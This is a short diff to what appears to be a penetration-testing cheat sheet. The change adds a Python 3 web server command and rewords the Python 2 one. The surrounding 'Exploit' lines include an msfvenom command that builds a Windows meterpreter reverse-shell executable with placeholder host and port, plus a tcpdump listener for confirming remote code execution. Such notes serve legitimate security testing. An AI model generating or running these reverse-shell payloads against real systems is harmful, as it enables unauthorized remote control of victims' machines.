@@ -9,7 +9,8 @@
 * _https://retirejs.github.io/retire.js/ find old javascript libraries with known vulns on a a page_
 
 ## Exploit
-* `python -m SimpleHTTPServer 80` _Start web server on kali in current dir_
+* `python -m SimpleHTTPServer 80` _Start python 2 web server on kali on port 80 in current dir_
+* `python3 -m http.server 80` _Start a python 3 http server on port 80 in current directory_
 * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe >m.exe` _Make a standard meterpreter exe_
 * `tcpdump -i {tun0} icmp` _Listen for ping requests.  Useful when testing RCE_
 
